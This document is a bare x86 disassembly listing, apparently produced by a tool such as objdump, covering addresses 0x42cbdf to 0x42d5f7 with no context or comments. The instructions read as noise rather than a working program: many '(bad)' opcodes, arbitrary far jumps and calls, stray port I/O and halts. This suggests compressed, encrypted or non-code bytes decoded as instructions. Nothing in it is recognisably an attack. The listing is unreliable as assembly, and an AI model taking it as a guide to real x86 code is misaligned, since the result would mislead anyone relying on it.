  42cbdf:	test   eax,0x7740d5a7
  42cbe4:	jmp    0xd8cf:0xea5ee93c
  42cbeb:	enter  0x6ae,0xac
  42cbef:	inc    ebp
  42cbf0:	mov    ebp,0xd258f485
  42cbf5:	out    dx,eax
  42cbf6:	repz push esp
  42cbf8:	or     BYTE PTR [edi],dl
  42cbfa:	mov    bl,0x86
  42cbfc:	outs   dx,BYTE PTR ds:[esi]
  42cbfd:	jb     0x42cbdc
  42cbff:	std    
  42cc00:	mov    eax,ds:0xa2f6ea24
  42cc05:	xor    BYTE PTR ds:[ebx+0x20],ch
  42cc09:	or     al,0xf0
  42cc0b:	cs test eax,0x2f794489
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x5411500f
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xa1000001
  42cc8d:	jo     0x42cc65
  42cc8f:	xchg   ebp,eax
  42cc90:	aaa    
  42cc91:	in     eax,0x55
  42cc93:	hlt    
  42cc94:	cmp    dh,BYTE PTR [ebp-0x57aee7ea]
  42cc9a:	lds    edx,FWORD PTR [eax+eax*1]
  42cc9d:	mov    bl,0xe5
  42cc9f:	sbb    eax,0xb4d91160
  42cca4:	call   0x66a31732
  42cca9:	lds    ebp,FWORD PTR [edx-0x6758d8be]
  42ccaf:	shl    BYTE PTR [edx],cl
  42ccb1:	ret    
  42ccb2:	shr    BYTE PTR [eax+edi*1],1
  42ccb5:	aaa    
  42ccb6:	dec    edi
  42ccb7:	and    eax,0x3cde4915
  42ccbc:	mov    ah,0xc
  42ccbe:	or     al,0xf4
  42ccc0:	or     edx,ebx
  42ccc2:	adc    DWORD PTR [esi-0x6fbc7c63],edx
  42ccc8:	in     al,0xf1
  42ccca:	adc    DWORD PTR [ecx+eax*2+0x6a9df54c],0x13
  42ccd2:	jno    0x42cd3a
  42ccd4:	mov    bl,0xe5
  42ccd6:	add    al,0x2d
  42ccd8:	inc    edi
  42ccd9:	retf   
  42ccda:	pop    ds
  42ccdb:	imul   BYTE PTR [esi-0x21aee8a]
  42cce1:	add    al,0x28
  42cce3:	aaa    
  42cce4:	mov    dh,0x6
  42cce6:	fldcw  WORD PTR [edx+ebx*8-0xd]
  42ccea:	push   dx
  42ccec:	lods   al,BYTE PTR ds:[esi]
  42cced:	fdivr  QWORD PTR [ecx+0x3ae866ae]
  42ccf3:	fsubr  st,st(2)
  42ccf5:	jmp    0x42ccc9
  42ccf7:	mov    al,0xe4
  42ccf9:	in     al,dx
  42ccfa:	mov    al,0x22
  42ccfc:	mov    esp,0xc81ce2b6
  42cd01:	lds    edi,FWORD PTR [esi]
  42cd03:	mov    ecx,0x18417f2
  42cd08:	into   
  42cd09:	xchg   ebp,eax
  42cd0a:	call   0x26d81645
  42cd0f:	loope  0x42cd7a
  42cd11:	pop    ebx
  42cd12:	aas    
  42cd13:	sub    al,0xf8
  42cd15:	push   ebx
  42cd16:	inc    ebx
  42cd17:	call   0xd4e535a4
  42cd1c:	(bad)  
  42cd1d:	mov    dh,0xf9
  42cd1f:	scas   eax,DWORD PTR es:[edi]
  42cd20:	xor    ebp,DWORD PTR [ecx-0x5a6900e5]
  42cd26:	int3   
  42cd27:	popf   
  42cd28:	mov    edi,0xf35fd730
  42cd2d:	cmc    
  42cd2e:	dec    ecx
  42cd2f:	sbb    eax,esp
  42cd31:	sbb    al,ah
  42cd33:	xlat   BYTE PTR ds:[ebx]
  42cd34:	cs pusha 
  42cd36:	sub    DWORD PTR [eax],edi
  42cd38:	imul   ebx,DWORD PTR [esi],0x9928c99e
  42cd3e:	ret    0x6b24
  42cd41:	scas   al,BYTE PTR es:[edi]
  42cd42:	sub    BYTE PTR [ebx+0x386246a5],bh
  42cd48:	in     eax,0xd0
  42cd4a:	add    bh,BYTE PTR [ecx]
  42cd4c:	or     BYTE PTR [ebx],bh
  42cd4e:	pop    ds
  42cd4f:	xchg   DWORD PTR [eax+edx*2-0x4],esi
  42cd53:	and    al,BYTE PTR [ebx+0x462bc6a8]
  42cd59:	(bad)  
  42cd5b:	sbb    al,BYTE PTR [ebp-0x352787a3]
  42cd61:	mov    al,ss:0xc79cce46
  42cd67:	fiadd  DWORD PTR [edx]
  42cd69:	sar    BYTE PTR [edx],cl
  42cd6b:	push   ebp
  42cd6c:	clc    
  42cd6d:	imul   esi,DWORD PTR [eax],0x1
  42cd70:	arpl   WORD PTR [esi-0x1a],bp
  42cd73:	lds    eax,FWORD PTR [edi-0x2a12c5f8]
  42cd79:	test   DWORD PTR [edx-0x7562595c],ebp
  42cd7f:	jge    0x42cd0d
  42cd81:	mov    edi,0x9675d4b1
  42cd86:	pop    esp
  42cd87:	adc    edx,DWORD PTR [ebx-0x7b7869c5]
  42cd8d:	rol    BYTE PTR [esi+0x606c],cl
	...
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x26
  42ce01:	push   ebx
  42ce02:	jbe    0x42cded
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0xcf000001,al
  42ce0d:	sub    al,0xb0
  42ce0f:	xor    al,al
  42ce11:	dec    ebx
  42ce12:	hlt    
  42ce13:	test   DWORD PTR [ebp-0x27d37db2],esi
  42ce19:	enter  0xc9c,0x0
  42ce1d:	jb     0x42cdd6
  42ce1f:	cld    
  42ce20:	js     0x42ce23
  42ce22:	sbb    DWORD PTR [edi-0x78],edx
  42ce25:	fs stos BYTE PTR es:[edi],al
  42ce27:	es jnp 0x42ce9d
  42ce2a:	mov    ch,0x2c
  42ce2c:	mov    edx,0x7c63cc33
  42ce31:	jge    0x42ce31
  42ce33:	add    eax,0xe73886bd
  42ce38:	div    DWORD PTR ds:0x2a059cd6
  42ce3e:	jmp    0x42ce82
  42ce40:	out    dx,al
  42ce41:	and    BYTE PTR [ecx+0x7dfea045],bl
  42ce47:	xor    al,BYTE PTR [ecx-0x54faee3d]
  42ce4d:	dec    esi
  42ce4e:	xchg   ebp,eax
  42ce4f:	sub    dh,ah
  42ce51:	arpl   WORD PTR ds:0xb6f64d10,ax
  42ce57:	xchg   DWORD PTR [edi-0x49],ecx
  42ce5a:	in     eax,0x60
  42ce5c:	jne    0x42ce04
  42ce5e:	mov    edx,0x13eaa76f
  42ce63:	push   0x72db7ebc
  42ce68:	xchg   edx,eax
  42ce69:	js     0x42ce03
  42ce6b:	lahf   
  42ce6c:	xor    ah,BYTE PTR [ecx-0x23125581]
  42ce72:	mov    bl,0x9b
  42ce74:	ret    0x8c56
  42ce77:	jecxz  0x42ce36
  42ce79:	mov    edx,0x8bab6481
  42ce7e:	add    eax,0x679c61f
  42ce83:	pop    ss
  42ce84:	imul   eax,ecx,0x6e23d8fd
  42ce8a:	retf   0xfc0d
  42ce8d:	and    eax,0x15ebdb93
  42ce92:	mov    ecx,0x3411de48
  42ce97:	pop    ds
  42ce98:	sbb    cl,BYTE PTR [ecx+eiz*2+0x6994cd85]
  42ce9f:	or     ch,BYTE PTR [eax-0x6066cb5d]
  42cea5:	xchg   BYTE PTR [ecx+0x7d],dh
  42cea8:	(bad)  
  42cea9:	mov    al,ds:0xbbeef1f9
  42ceae:	nop
  42ceaf:	das    
  42ceb0:	or     edi,DWORD PTR [bx+di-0x6f]
  42ceb4:	leave  
  42ceb5:	and    eax,DWORD PTR [eax+0x17ac4204]
  42cebb:	jl     0x42ce44
  42cebd:	fwait
  42cebe:	cmp    ebx,DWORD PTR ss:[ebx+0x5c]
  42cec2:	or     BYTE PTR [edi-0x62eb774f],dh
  42cec8:	daa    
  42cec9:	shl    esp,cl
  42cecb:	inc    ebx
  42cecc:	ja     0x42ce5f
  42cece:	jmp    0x5cdaed5e
  42ced3:	(bad)
  42ced8:	ja     0x42ceaf
  42ceda:	push   ebx
  42cedb:	retf   0x878c
  42cede:	pop    esi
  42cedf:	gs xchg DWORD PTR cs:[ecx+0x2e37e93a],ebx
  42cee7:	fwait
  42cee8:	dec    eax
  42cee9:	adc    ebp,ecx
  42ceeb:	sahf   
  42ceec:	ss retf 0x8bd9
  42cef0:	or     edi,DWORD PTR [eax]
  42cef2:	aas    
  42cef3:	ins    DWORD PTR es:[edi],dx
  42cef4:	add    DWORD PTR [esp+ebx*4],esi
  42cef7:	pushf  
  42cef8:	into   
  42cef9:	call   0x1811:0x6194b585
  42cf00:	mov    ch,bl
  42cf02:	ficom  WORD PTR [ebx-0x62]
  42cf05:	add    bh,BYTE PTR [ebx-0x1e]
  42cf08:	dec    ebp
  42cf09:	jne    0x42cebf
  42cf0b:	(bad)  
  42cf0c:	aad    0xd5
  42cf0e:	in     eax,dx
  42cf0f:	test   eax,0xa8
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    esp,FWORD PTR [eax+0x13c21cf5]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0x9000001,al
  42cf8d:	in     eax,0x7c
  42cf8f:	loop   0x42cf8a
  42cf91:	push   edi
  42cf92:	or     al,0x77
  42cf94:	push   edi
  42cf95:	jecxz  0x42cf43
  42cf97:	sbb    DWORD PTR [ebp-0xf62363],ebp
  42cf9d:	sbb    al,0x13
  42cf9f:	(bad)  
  42cfa0:	mov    esp,0x592faa7e
  42cfa5:	push   ss
  42cfa6:	xor    dh,BYTE PTR [ecx]
  42cfa8:	test   eax,0x3d7529f3
  42cfad:	dec    BYTE PTR [ebx-0x3]
  42cfb0:	inc    edi
  42cfb1:	xchg   eax,edx
  42cfb3:	push   es
  42cfb4:	pop    ebx
  42cfb5:	lock mov bl,BYTE PTR [ebx+0x53]
  42cfb9:	aas    
  42cfba:	xor    ecx,esp
  42cfbc:	push   ecx
  42cfbd:	ja     0x42cfde
  42cfbf:	das    
  42cfc0:	pop    ebp
  42cfc1:	sbb    DWORD PTR [ebp-0x42],eax
  42cfc4:	and    bl,BYTE PTR [edi]
  42cfc6:	pusha  
  42cfc7:	pop    edi
  42cfc8:	push   ds
  42cfc9:	lods   eax,DWORD PTR ds:[esi]
  42cfca:	sub    al,0x89
  42cfcc:	hlt    
  42cfcd:	xor    DWORD PTR [edi+0x350121aa],ebp
  42cfd3:	xor    al,0xe2
  42cfd5:	les    ecx,FWORD PTR [edi]
  42cfd7:	retf   
  42cfd8:	lahf   
  42cfd9:	mov    WORD PTR [eax+0x3d048d1c],ss
  42cfdf:	and    BYTE PTR [edi-0x21],dl
  42cfe2:	cmp    al,0x24
  42cfe4:	pusha  
  42cfe5:	xchg   esi,eax
  42cfe6:	es sbb esp,esi
  42cfe9:	jnp    0x42cfcf
  42cfeb:	sub    al,0x45
  42cfee:	mov    bh,0xca
  42cff0:	aam    0x2b
  42cff2:	xor    DWORD PTR [esi+0x211007fb],edx
  42cff8:	jmp    0x42cfb5
  42cffa:	das    
  42cffb:	lds    edx,FWORD PTR [ebx]
  42cffd:	dec    edi
  42cffe:	sbb    dl,dl
  42d000:	inc    edx
  42d001:	out    0x35,al
  42d003:	adc    DWORD PTR [esi-0xe6ddba7],edi
  42d009:	pusha  
  42d00a:	mov    ch,0x4
  42d00c:	mov    WORD PTR [esi],?
  42d00e:	out    dx,eax
  42d00f:	cmp    al,0x58
  42d011:	add    BYTE PTR [ecx-0xc],dl
  42d014:	inc    ecx
  42d015:	mov    ds:0x15cbae39,al
  42d01a:	dec    esp
  42d01b:	add    esi,ebx
  42d01d:	inc    ecx
  42d01e:	jne    0x42d068
  42d020:	add    DWORD PTR [ebx+0x3e],ecx
  42d023:	inc    ecx
  42d024:	mov    ebx,0x6304f8c4
  42d029:	adc    ah,al
  42d02b:	fdivr  DWORD PTR [ebp-0x1e]
  42d02e:	sbb    eax,0x98f4d752
  42d033:	lock jp 0x42d054
  42d036:	dec    esp
  42d037:	sbb    DWORD PTR [edi+0x49],0x6158a66
  42d03e:	dec    edx
  42d03f:	mov    ds:0xf77541cd,al
  42d044:	xchg   esp,eax
  42d045:	pop    edx
  42d046:	jne    0x42d083
  42d048:	dec    esp
  42d049:	inc    esi
  42d04a:	jbe    0x42d002
  42d04c:	sub    eax,ecx
  42d04e:	cmp    edx,esp
  42d050:	mov    al,0x87
  42d052:	das    
  42d053:	pop    es
  42d054:	iret   
  42d055:	add    BYTE PTR [edi+0x15],bl
  42d058:	imul   ecx,DWORD PTR [esi-0x11],0x9636a6e6
  42d05f:	xor    BYTE PTR [eax-0x78],bh
  42d062:	ret    
  42d063:	cdq    
  42d064:	xor    eax,0x4c407654
  42d069:	loopne 0x42cffc
  42d06b:	enter  0x2889,0xed
  42d06f:	fst    QWORD PTR [edi+0x5d95ff41]
  42d075:	dec    eax
  42d076:	imul   ebx,ebx,0xcdfc767a
  42d07c:	pop    esi
  42d07d:	pop    ecx
  42d07e:	adc    esp,DWORD PTR [ebx+0x2a055c1a]
  42d084:	or     al,0x14
  42d086:	sub    esi,DWORD PTR [ecx]
  42d088:	fcomp  QWORD PTR [edi]
  42d08a:	sub    DWORD PTR [ebx],0x3a7eade5
  42d090:	pop    ecx
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [edi-0x7],ah
  42d102:	sub    ah,BYTE PTR [ecx+0x18]
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x72000001,al
  42d10d:	out    0xd8,al
  42d10f:	scas   al,BYTE PTR es:[edi]
  42d110:	scas   eax,DWORD PTR es:[edi]
  42d111:	mov    al,0xc4
  42d113:	scas   al,BYTE PTR es:[edi]
  42d114:	sub    edi,DWORD PTR [ecx]
  42d116:	mov    eax,0xd3a1fc22
  42d11b:	sti    
  42d11c:	mov    ch,0xd2
  42d11e:	dec    ebp
  42d11f:	in     al,dx
  42d120:	dec    ebp
  42d121:	int3   
  42d122:	sbb    BYTE PTR [edx+0x7],dl
  42d125:	dec    eax
  42d126:	jnp    0x42d173
  42d128:	(bad)  ss:[eax]
  42d12b:	dec    esp
  42d12c:	cmp    cl,ch
  42d12e:	xchg   ebx,eax
  42d12f:	aam    0x6a
  42d131:	mov    eax,0xba20a613
  42d136:	jl     0x42d193
  42d138:	mov    dh,0x7f
  42d13a:	stos   DWORD PTR es:[edi],eax
  42d13b:	jae    0x42d0c5
  42d13d:	je     0x42d0f8
  42d13f:	mov    ecx,gs
  42d141:	repnz cmp BYTE PTR [bx],ah
  42d145:	aam    0x4e
  42d147:	fcom   st(1)
  42d149:	repnz int 0x4d
  42d14c:	iret   
  42d14d:	add    dl,dh
  42d14f:	outs   dx,DWORD PTR ds:[esi]
  42d150:	mov    edx,0x3d91c74e
  42d155:	dec    ecx
  42d156:	pop    ebp
  42d157:	call   0x2274:0xe73d487a
  42d15e:	pop    es
  42d15f:	and    cl,BYTE PTR [ebp+0x456c72d7]
  42d165:	fwait
  42d166:	js     0x42d122
  42d168:	aas    
  42d169:	sbb    bh,bl
  42d16b:	pop    eax
  42d16c:	cmp    al,0xc3
  42d16e:	inc    esi
  42d16f:	out    0x96,al
  42d171:	fsubp  st(7),st
  42d173:	int3   
  42d174:	pop    ecx
  42d175:	outs   dx,DWORD PTR ds:[esi]
  42d176:	add    ecx,esp
  42d178:	(bad)  
  42d179:	arpl   WORD PTR [esi-0x25],si
  42d17c:	xchg   DWORD PTR [esi+esi*1-0x77],edi
  42d180:	cmp    eax,DWORD PTR [ebx+0x161f5140]
  42d186:	in     al,0x7e
  42d188:	je     0x42d182
  42d18a:	xor    al,0xf2
  42d18c:	and    eax,0xcc47fedc
  42d191:	dec    eax
  42d192:	retf   0x1560
  42d195:	out    dx,al
  42d196:	or     edi,esp
  42d198:	in     al,0x67
  42d19a:	or     esp,ebx
  42d19c:	cld    
  42d19d:	mov    edi,0x1e9b9994
  42d1a2:	dec    eax
  42d1a3:	pop    ebp
  42d1a4:	push   edi
  42d1a5:	sub    al,0xfa
  42d1a7:	jo     0x42d13a
  42d1a9:	jecxz  0x42d130
  42d1ab:	out    dx,eax
  42d1ac:	cld    
  42d1ad:	in     al,dx
  42d1ae:	jno    0x42d194
  42d1b0:	inc    edi
  42d1b1:	test   eax,0x8631b6ba
  42d1b6:	cwde   
  42d1b7:	mov    DWORD PTR [ecx],ebx
  42d1b9:	or     DWORD PTR ds:0x45354554,edi
  42d1c0:	(bad)  
  42d1c1:	sbb    al,0x0
  42d1c3:	ret    0x3dba
  42d1c6:	ds aad 0xba
  42d1c9:	jp     0x42d173
  42d1cb:	pushf  
  42d1cc:	ins    BYTE PTR es:[edi],dx
  42d1cd:	push   cs
  42d1ce:	in     eax,dx
  42d1cf:	adc    bh,BYTE PTR [eax]
  42d1d1:	xor    DWORD PTR [ecx],eax
  42d1d3:	sar    DWORD PTR [ebx-0x3fba2d61],1
  42d1d9:	push   edx
  42d1da:	xchg   edi,eax
  42d1db:	xchg   ebx,eax
  42d1dc:	lods   al,BYTE PTR ds:[esi]
  42d1dd:	xor    al,0x6b
  42d1df:	aam    0xec
  42d1e1:	push   es
  42d1e2:	cmc    
  42d1e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1e4:	jp     0x42d1c0
  42d1e6:	ins    DWORD PTR es:[edi],dx
  42d1e7:	inc    edx
  42d1e8:	loop   0x42d257
  42d1ea:	mov    ebx,0x7f406ad0
  42d1ef:	out    0x48,al
  42d1f1:	int    0xbd
  42d1f3:	push   0x3c
  42d1f5:	ja     0x42d203
  42d1f7:	xchg   ebp,eax
  42d1f8:	leave  
  42d1f9:	mov    dh,0x8d
  42d1fb:	or     eax,0x94095726
  42d200:	push   esp
  42d201:	add    BYTE PTR [eax-0x44],0xa3
  42d205:	ja     0x42d206
  42d207:	mov    ebx,esp
  42d209:	inc    edi
  42d20a:	pop    edi
  42d20b:	and    al,0x83
  42d20d:	mov    esp,0x71e6c5
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d255
  42d281:	cmc    
  42d282:	int3   
  42d283:	jo     0x42d2a2
  42d285:	in     al,0x1
  42d287:	add    BYTE PTR ds:0xd8000001,al
  42d28d:	lea    eax,[edi-0x63df1498]
  42d293:	test   BYTE PTR [ebx],bh
  42d295:	ds and al,0xd7
  42d298:	inc    edx
  42d299:	mov    bh,0x23
  42d29b:	mov    bl,dl
  42d29d:	inc    ebx
  42d29e:	xchg   esp,eax
  42d29f:	ds stos BYTE PTR es:[edi],al
  42d2a1:	fidivr DWORD PTR [edx+ebx*1-0x1a8689a8]
  42d2a8:	xchg   ecx,eax
  42d2a9:	push   esp
  42d2aa:	push   cs
  42d2ab:	dec    edx
  42d2ac:	sub    eax,0x3a419dac
  42d2b1:	in     eax,dx
  42d2b2:	pop    ebx
  42d2b3:	mov    dh,0x5b
  42d2b5:	test   BYTE PTR [ecx+0xc070c3e],bh
  42d2bb:	(bad)  
  42d2bc:	dec    ebx
  42d2bd:	fs or  dh,0xb0
  42d2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2c2:	cmp    eax,0x84106c4b
  42d2c7:	pop    ebx
  42d2c8:	aaa    
  42d2c9:	xor    al,0xee
  42d2cb:	retf   
  42d2cc:	repnz mov eax,0x7478ef95
  42d2d2:	mov    ah,0x8e
  42d2d4:	mov    eax,0x7bedb102
  42d2d9:	pop    esp
  42d2da:	out    0x8e,eax
  42d2dc:	in     eax,0x10
  42d2de:	push   ebp
  42d2df:	loopne 0x42d2c9
  42d2e1:	xchg   BYTE PTR [ecx-0x74],dl
  42d2e4:	push   ds
  42d2e5:	sbb    eax,0xd33b8056
  42d2ea:	pop    ecx
  42d2eb:	jb     0x42d2fc
  42d2ed:	cmp    al,0xf
  42d2ef:	popa   
  42d2f0:	popfw  
  42d2f2:	jg     0x42d35c
  42d2f4:	ds ins DWORD PTR es:[edi],dx
  42d2f6:	jb     0x42d32f
  42d2f8:	mov    esi,0xfae5d6f3
  42d2fd:	out    0x8d,al
  42d2ff:	add    ch,BYTE PTR [ebx]
  42d301:	outs   dx,DWORD PTR ds:[esi]
  42d302:	lea    ebx,[ebx-0x7a9eae14]
  42d308:	xor    ah,ah
  42d30a:	cld    
  42d30b:	std    
  42d30c:	xor    eax,0x7f57aaa1
  42d311:	or     BYTE PTR [ecx-0x59],cl
  42d314:	gs das 
  42d316:	mov    ah,0x83
  42d318:	jae    0x42d334
  42d31a:	pop    eax
  42d31b:	xor    DWORD PTR [edi+0x47],eax
  42d31e:	jb     0x42d379
  42d320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d321:	pushf  
  42d322:	xlat   BYTE PTR ds:[ebx]
  42d323:	or     DWORD PTR [edi],0xffffffc7
  42d326:	mov    edx,0x3703982f
  42d32b:	add    eax,0xa8393c5a
  42d330:	dec    ebp
  42d331:	mov    ch,0xc9
  42d333:	add    eax,0x13e33258
  42d338:	mov    ds:0x8f7ae0f8,eax
  42d33d:	in     eax,0x7a
  42d33f:	cmp    DWORD PTR [eax-0x8],esp
  42d342:	outs   dx,BYTE PTR ds:[esi]
  42d343:	in     al,0x0
  42d345:	shr    DWORD PTR [ebp+0x78],cl
  42d348:	and    ecx,ecx
  42d34a:	xchg   ebx,eax
  42d34b:	xor    DWORD PTR [ebx+0x71],esp
  42d34e:	mov    eax,0x14cac134
  42d353:	adc    eax,0xfb57cdd7
  42d358:	jl     0x42d3a2
  42d35a:	mov    bh,0x45
  42d35c:	es stos BYTE PTR es:[edi],al
  42d35e:	xor    ch,BYTE PTR ds:0x549bbc40
  42d364:	jno    0x42d2ea
  42d366:	sahf   
  42d367:	fwait
  42d368:	xor    DWORD PTR [ebp-0x2f2b58f0],esi
  42d36e:	xchg   ecx,eax
  42d36f:	repz push ebp
  42d371:	scas   eax,DWORD PTR es:[edi]
  42d372:	test   BYTE PTR [ecx+0x3b],ch
  42d375:	icebp  
  42d376:	xor    bl,BYTE PTR [edi+0x6b869e8d]
  42d37c:	jg     0x42d3c3
  42d37e:	out    dx,eax
  42d37f:	nop
  42d380:	cmc    
  42d381:	retf   0x287c
  42d384:	jnp    0x42d355
  42d386:	cmp    al,0x42
  42d388:	mov    ch,0x56
  42d38a:	adc    cl,dl
  42d38c:	jp     0x42d3e4
  42d38e:	pop    es
  42d38f:	dec    esp
  42d390:	nop
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	icebp  
  42d401:	shl    DWORD PTR [eax+0x15],0x22
  42d405:	in     eax,0x1
  42d407:	add    BYTE PTR ds:0x22000001,al
  42d40d:	repz inc ebp
  42d40f:	mov    bh,0x7f
  42d411:	lds    ebx,FWORD PTR [edi+0x2fd68932]
  42d417:	jmp    0x42d41d
  42d419:	bound  esp,QWORD PTR [ebx-0x25]
  42d41c:	jo     0x42d3cc
  42d41e:	neg    DWORD PTR es:[esi]
  42d421:	xchg   si,ax
  42d423:	jecxz  0x42d3bf
  42d425:	sbb    dh,BYTE PTR [esi+0x3d]
  42d428:	test   BYTE PTR ds:0x5d936b40,al
  42d42e:	pop    eax
  42d42f:	push   edx
  42d430:	push   0x2d
  42d432:	and    DWORD PTR [eax+esi*2],edx
  42d435:	push   esi
  42d436:	sub    cl,dl
  42d438:	clc    
  42d439:	jae    0x42d3d2
  42d43b:	test   eax,0x65cf80de
  42d440:	cwde   
  42d441:	jns    0x42d3ee
  42d443:	inc    ebp
  42d444:	lea    edi,ds:0xaa7f17d7
  42d44a:	inc    esi
  42d44b:	gs stos DWORD PTR es:[edi],eax
  42d44d:	ret    0x1df1
  42d450:	rcr    DWORD PTR [ebx-0xa50bd5a],1
  42d456:	mov    edi,0xa546d6f5
  42d45b:	out    0x9d,al
  42d45d:	aas    
  42d45e:	adc    eax,0xcc476eea
  42d463:	adc    al,0x49
  42d465:	stc    
  42d466:	mov    bl,BYTE PTR [edx]
  42d468:	cmp    esp,DWORD PTR [esi-0x55]
  42d46b:	mov    dh,0x3c
  42d46d:	inc    edi
  42d46e:	ss xchg edi,eax
  42d470:	fisub  DWORD PTR [ecx+0x2c]
  42d473:	sub    ah,al
  42d475:	dec    ebx
  42d477:	xlat   BYTE PTR ds:[ebx]
  42d478:	jne    0x42d4e9
  42d47a:	adc    esp,DWORD PTR [edi]
  42d47c:	lahf   
  42d47d:	xchg   ebp,eax
  42d47e:	ja     0x42d440
  42d480:	and    ch,BYTE PTR [ecx]
  42d482:	ror    DWORD PTR [edx-0x165e2bc9],0xcd
  42d489:	stos   DWORD PTR es:[edi],eax
  42d48a:	in     eax,dx
  42d48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d48c:	in     al,0xb7
  42d48e:	cs add eax,0x8a6e983
  42d494:	and    BYTE PTR [esi-0x1cc77b54],0x75
  42d49b:	push   ebp
  42d49c:	rcr    BYTE PTR [ebp+0x5],0x9
  42d4a0:	add    DWORD PTR [edi],eax
  42d4a2:	mov    ch,0xf2
  42d4a4:	push   cs
  42d4a5:	aaa    
  42d4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4a7:	lock push esi
  42d4a9:	aad    0x76
  42d4ab:	add    cl,BYTE PTR [esi+ecx*8-0x2393449c]
  42d4b2:	adc    DWORD PTR [edi+0x7d],ecx
  42d4b5:	pop    edx
  42d4b6:	dec    ecx
  42d4b7:	dec    eax
  42d4b8:	in     eax,0x8f
  42d4ba:	call   0x37d6:0x238ea06b
  42d4c1:	(bad)  
  42d4c3:	pop    edx
  42d4c4:	dec    esp
  42d4c5:	(bad)  
  42d4c6:	repz push eax
  42d4c8:	sub    al,0x3f
  42d4ca:	xor    BYTE PTR [ecx-0x80],0xf3
  42d4ce:	xor    eax,0xd8785116
  42d4d3:	jns    0x42d52a
  42d4d5:	fsub   QWORD PTR [eax+0x17]
  42d4d8:	imul   DWORD PTR ds:0xc40fcb21
  42d4de:	int    0xc5
  42d4e0:	imul   ecx,DWORD PTR [eax],0x6d829c6b
  42d4e6:	cmp    BYTE PTR [eax-0x947783e],bl
  42d4ec:	nop
  42d4ed:	(bad)  
  42d4ef:	or     DWORD PTR [ebx+0x1d1cae10],edi
  42d4f5:	dec    esp
  42d4f6:	sbb    BYTE PTR [bp+si+0x6444],ah
  42d4fb:	fidiv  WORD PTR [ebx-0x3233edf9]
  42d501:	(bad)  
  42d502:	outs   dx,DWORD PTR ds:[esi]
  42d503:	popa   
  42d504:	cmp    edx,DWORD PTR [ecx-0x67aa56f5]
  42d50a:	push   ss
  42d50b:	(bad)  
  42d50c:	push   DWORD PTR [ecx+0xd28854]
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x81dfc1d5,eax
  42d583:	inc    esp
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x8000001,al
  42d58d:	sub    DWORD PTR [ebp-0x62],esp
  42d590:	cwde   
  42d591:	repz cld 
  42d593:	out    0x95,al
  42d595:	cmp    edx,ebx
  42d597:	cld    
  42d598:	aad    0x9a
  42d59a:	push   edi
  42d59b:	out    dx,eax
  42d59c:	int3   
  42d59d:	jno    0x42d61a
  42d59f:	mov    ds:0x9cf1e03f,eax
  42d5a4:	cld    
  42d5a5:	xchg   ebx,eax
  42d5a6:	add    al,0x14
  42d5a8:	push   ss
  42d5a9:	cmp    edi,esp
  42d5ab:	jg     0x42d582
  42d5ad:	jnp    0x42d548
  42d5af:	out    0xc9,al
  42d5b1:	push   esi
  42d5b2:	jno    0x42d5c4
  42d5b4:	mov    bl,ch
  42d5b6:	mov    al,0x2d
  42d5b8:	push   edi
  42d5b9:	clc    
  42d5ba:	clc    
  42d5bb:	and    eax,0x97a8c0c8
  42d5c0:	inc    esp
  42d5c1:	add    BYTE PTR [edx+0x3b],bh
  42d5c4:	ins    BYTE PTR es:[edi],dx
  42d5c5:	arpl   WORD PTR [ebx+0x48],si
  42d5c8:	xor    DWORD PTR [eiz*8-0x15c90968],esp
  42d5cf:	aad    0xf1
  42d5d1:	out    dx,eax
  42d5d2:	pop    eax
  42d5d3:	mov    ebp,0x40a76d90
  42d5d8:	(bad)  
  42d5d9:	pop    esp
  42d5da:	xor    edi,DWORD PTR ds:0xb7a8d5bf
  42d5e0:	pushf  
  42d5e1:	push   edx
  42d5e2:	gs jecxz 0x42d599
  42d5e5:	add    al,0x1c
  42d5e7:	jmp    0x6bc7:0x5c043daf
  42d5ee:	addr16 test al,0x3e
  42d5f1:	or     cl,BYTE PTR [esi+0x4b26034b]
  42d5f7:	mov    esp,DWORD PTR [esp+esi*1+0x4724fe41]
